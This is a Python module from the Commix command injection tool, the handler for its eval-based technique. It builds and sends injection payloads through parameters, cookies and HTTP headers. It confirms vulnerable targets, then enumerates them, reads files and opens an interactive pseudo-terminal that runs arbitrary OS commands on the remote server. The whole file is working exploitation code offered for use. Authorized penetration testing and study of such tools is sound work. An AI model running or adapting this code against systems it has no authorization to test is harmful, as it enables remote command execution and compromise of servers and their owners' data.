#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2024 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import os
import re
import sys
import time
import string
import random
from src.thirdparty.six.moves import input as _input
from src.thirdparty.six.moves import urllib as _urllib
from src.utils import menu
from src.utils import logs
from src.utils import settings
from src.utils import common
from src.utils import session_handler
from src.thirdparty.colorama import Fore, Back, Style, init
from src.core.requests import headers
from src.core.requests import requests
from src.core.requests import parameters
from src.core.injections.controller import checks
from src.core.injections.controller import shell_options
from src.core.injections.results_based.techniques.eval_based import eb_injector
from src.core.injections.results_based.techniques.eval_based import eb_payloads
from src.core.injections.results_based.techniques.eval_based import eb_enumeration
from src.core.injections.results_based.techniques.eval_based import eb_file_access

"""
The dynamic code evaluation (aka eval-based) technique.
"""

"""
The "eval-based" injection technique handler.
"""
def eb_injection_handler(url, timesec, filename, http_request_method, injection_type, technique):

  shell = False
  counter = 1
  vp_flag = True
  no_result = True
  export_injection_info = False

  for item in range(0, len(settings.EXECUTION_FUNCTIONS)):
    settings.EXECUTION_FUNCTIONS[item] = "${" + settings.EXECUTION_FUNCTIONS[item] + "("
  settings.EVAL_PREFIXES = settings.EVAL_PREFIXES + settings.EXECUTION_FUNCTIONS

  checks.testing_technique_title(injection_type, technique)

  i = 0
  # Calculate all possible combinations
  total = len(settings.WHITESPACES) * len(settings.EVAL_PREFIXES) * len(settings.EVAL_SEPARATORS) * len(settings.EVAL_SUFFIXES)
  for whitespace in settings.WHITESPACES:
    for prefix in settings.EVAL_PREFIXES:
      for suffix in settings.EVAL_SUFFIXES:
        for separator in settings.EVAL_SEPARATORS:
          if whitespace == settings.SINGLE_WHITESPACE:
            whitespace = _urllib.parse.quote(whitespace)
          # Check injection state
          settings.DETECTION_PHASE = True
          settings.EXPLOITATION_PHASE = False
          # If a previous session is available.
          if settings.LOAD_SESSION and session_handler.notification(url, technique, injection_type):
            try:
              settings.EVAL_BASED_STATE = True
              url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, how_long, output_length, is_vulnerable = session_handler.injection_point_exportation(url, http_request_method)
              checks.check_for_stored_tamper(payload)
            except TypeError:
              checks.error_loading_session_file()

          if settings.RETEST == True:
            settings.RETEST = False
            from src.core.injections.results_based.techniques.classic import cb_handler
            cb_handler.exploitation(url, timesec, filename, http_request_method, injection_type=settings.INJECTION_TYPE.RESULTS_BASED_CI, technique=settings.INJECTION_TECHNIQUE.CLASSIC)
            checks.testing_technique_title(injection_type, technique)
          
          if not settings.LOAD_SESSION:
            i = i + 1
            # Check for bad combination of prefix and separator
            combination = prefix + separator
            if combination in settings.JUNK_COMBINATION:
              prefix = ""

            # Change TAG on every request to prevent false-positive results.
            TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6))

            randv1 = random.randrange(100)
            randv2 = random.randrange(100)
            randvcalc = randv1 + randv2

            # Define alter shell
            alter_shell = menu.options.alter_shell

            try:
              if alter_shell:
                # Classic -alter shell- decision payload (check if host is vulnerable).
                payload = eb_payloads.decision_alter_shell(separator, TAG, randv1, randv2)
              else:
                # Classic decision payload (check if host is vulnerable).
                payload = eb_payloads.decision(separator, TAG, randv1, randv2)

              # suffix = _urllib.parse.quote(suffix)
              # Fix prefixes / suffixes
              payload = parameters.prefixes(payload, prefix)
              payload = parameters.suffixes(payload, suffix)

              # Fixation for specific payload.
              if ")%3B" + ")}" in payload:
                payload = payload.replace(")%3B" +")}", ")" + ")}")
                #payload = payload + TAG + ""

              # Whitespace fixation
              payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)

              # Perform payload modification
              payload = checks.perform_payload_modification(payload)

              if not settings.TAMPER_SCRIPTS['base64encode'] and \
                   not settings.TAMPER_SCRIPTS['hexencode']:
                payload = payload.replace(settings.SINGLE_WHITESPACE, "%20")

              # Check if defined "--verbose" option.
              if settings.VERBOSITY_LEVEL != 0:
                print(settings.print_payload(payload))

              # Cookie header injection
              if settings.COOKIE_INJECTION == True:
                # Check if target host is vulnerable to cookie header injection.
                vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)
                response = eb_injector.cookie_injection_test(url, vuln_parameter, payload, http_request_method)

              # User-Agent HTTP header injection
              elif settings.USER_AGENT_INJECTION == True:
                # Check if target host is vulnerable to user-agent HTTP header injection.
                vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)
                response = eb_injector.user_agent_injection_test(url, vuln_parameter, payload, http_request_method)

              # Referer HTTP header injection
              elif settings.REFERER_INJECTION == True:
                # Check if target host is vulnerable to referer HTTP header injection.
                vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)
                response = eb_injector.referer_injection_test(url, vuln_parameter, payload, http_request_method)

              # Host HTTP header injection
              elif settings.HOST_INJECTION == True:
                # Check if target host is vulnerable to host HTTP header injection.
                vuln_parameter = parameters.specify_host_parameter(menu.options.host)
                response = eb_injector.host_injection_test(url, vuln_parameter, payload, http_request_method)

              # Custom HTTP header injection
              elif settings.CUSTOM_HEADER_INJECTION == True:
                # Check if target host is vulnerable to custom HTTP header injection.
                vuln_parameter = parameters.specify_custom_header_parameter(settings.INJECT_TAG)
                response = eb_injector.custom_header_injection_test(url, vuln_parameter, payload, http_request_method)

              else:
                found_cookie_injection = False
                # Check if target host is vulnerable.
                response, vuln_parameter = eb_injector.injection_test(payload, http_request_method, url)
              # Try target page reload (if it is required).
              if settings.URL_RELOAD:
                response = requests.url_reload(url, timesec)
              # Evaluate test results.
              time.sleep(timesec)
              shell = eb_injector.injection_test_results(response, TAG, randvcalc)
              if settings.VERBOSITY_LEVEL == 0:
                percent, float_percent = checks.percentage_calculation(i, total)
                percent = checks.print_percentage(float_percent, no_result, shell)
                checks.injection_process(injection_type, technique, percent)

            except (KeyboardInterrupt, SystemExit):
              print(settings.SINGLE_WHITESPACE)
              raise

            except EOFError:
              if settings.STDIN_PARSING:
                print(settings.SINGLE_WHITESPACE)
              err_msg = "Exiting, due to EOFError."
              print(settings.print_error_msg(err_msg))
              raise

            except:
              continue

          # Yaw, got shellz!
          # Do some magic tricks!
          if shell:
            found = True
            no_result = False
            checks.identified_vulnerable_param(url, technique, injection_type, vuln_parameter, payload, http_request_method, filename, export_injection_info, vp_flag, counter)
            # Export session
            if not settings.LOAD_SESSION:
              session_handler.injection_point_importation(url, technique, injection_type, separator, shell[0], vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response=0, timesec=0, how_long=0, output_length=0, is_vulnerable=menu.options.level)
            else:
              whitespace = settings.WHITESPACES[0]
              settings.LOAD_SESSION = False

            # Check for any enumeration options.
            new_line = True
            if settings.ENUMERATION_DONE == True :
              while True:
                message = "Do you want to ignore stored session and enumerate again? [y/N] > "
                enumerate_again = common.read_input(message, default="N", check_batch=True)
                if enumerate_again in settings.CHOICE_YES:
                  if not menu.options.ignore_session:
                    menu.options.ignore_session = True
                  eb_enumeration.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
                  break
                elif enumerate_again in settings.CHOICE_NO:
                  new_line = False
                  break
                elif enumerate_again in settings.CHOICE_QUIT:
                  raise SystemExit()
                else:
                  common.invalid_option(enumerate_again)
                  pass
            else:
              if menu.enumeration_options():
                eb_enumeration.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)

            # Check for any enumeration options.
            eb_enumeration.stored_session(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
            # Check for any system file access options.
            eb_file_access.stored_session(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
            # Check if defined single cmd.
            if menu.options.os_cmd:
              eb_enumeration.single_os_cmd_exec(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)

            # Pseudo-Terminal shell
            try:
              checks.alert()
              go_back = False
              go_back_again = False
              while True:
                if go_back == True:
                  break
                message = settings.CHECKING_PARAMETER + " is vulnerable. Do you want to prompt for a pseudo-terminal shell? [Y/n] > "
                if settings.CRAWLING:
                  settings.CRAWLED_URLS_INJECTED.append(_urllib.parse.urlparse(url).netloc)
                if not settings.STDIN_PARSING:
                  gotshell = common.read_input(message, default="Y", check_batch=True)
                else:
                  gotshell = common.read_input(message, default="n", check_batch=True)
                if gotshell in settings.CHOICE_YES:
                  print(settings.OS_SHELL_TITLE)
                  if settings.READLINE_ERROR:
                    checks.no_readline_module()
                  while True:
                    if not settings.READLINE_ERROR:
                      checks.tab_autocompleter()
                    sys.stdout.write(settings.OS_SHELL)
                    cmd = common.read_input(message="", default="os_shell", check_batch=True)
                    cmd = checks.escaped_cmd(cmd)
                    if cmd.lower() in settings.SHELL_OPTIONS:
                      go_back, go_back_again = shell_options.check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, go_back, no_result, timesec, go_back_again, payload, OUTPUT_TEXTFILE="")
                      if go_back and go_back_again == False:
                        break
                      if go_back and go_back_again:
                        return True
                    else:
                      # The main command injection exploitation.
                      time.sleep(timesec)
                      response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
                      # Try target page reload (if it is required).
                      if settings.URL_RELOAD:
                        response = requests.url_reload(url, timesec)
                      if menu.options.ignore_session or\
                         session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
                        # Evaluate injection results.
                        shell = eb_injector.injection_results(response, TAG, cmd)
                        shell = "".join(str(p) for p in shell)
                        if not menu.options.ignore_session :
                          session_handler.store_cmd(url, cmd, shell, vuln_parameter)
                      else:
                        shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)

                      if shell or shell != "":
                        shell = "".join(str(p) for p in shell)
                        # Update logs with executed cmds and execution results.
                        logs.executed_command(filename, cmd, shell)
                        print(settings.command_execution_output(shell))
                      else:
                        err_msg = common.invalid_cmd_output(cmd)
                        print(settings.print_error_msg(err_msg))
                elif gotshell in settings.CHOICE_NO:
                  if checks.next_attack_vector(technique, go_back) == True:
                    break
                  else:
                    if no_result == True:
                      return False
                    else:
                      return True
                elif gotshell in settings.CHOICE_QUIT:
                  raise SystemExit()
                else:
                  common.invalid_option(gotshell)
                  pass

            except (KeyboardInterrupt, SystemExit):
              raise

            except EOFError:
              if settings.STDIN_PARSING:
                print(settings.SINGLE_WHITESPACE)
              err_msg = "Exiting, due to EOFError."
              print(settings.print_error_msg(err_msg))
              raise

  if no_result == True:
    if settings.VERBOSITY_LEVEL == 0:
      print(settings.SINGLE_WHITESPACE)
    return False
  else :
    sys.stdout.write("\r")
    sys.stdout.flush()

"""
The exploitation function.
(call the injection handler)
"""
def exploitation(url, timesec, filename, http_request_method, injection_type, technique):
  if eb_injection_handler(url, timesec, filename, http_request_method, injection_type, technique) == False:
    return False

# eof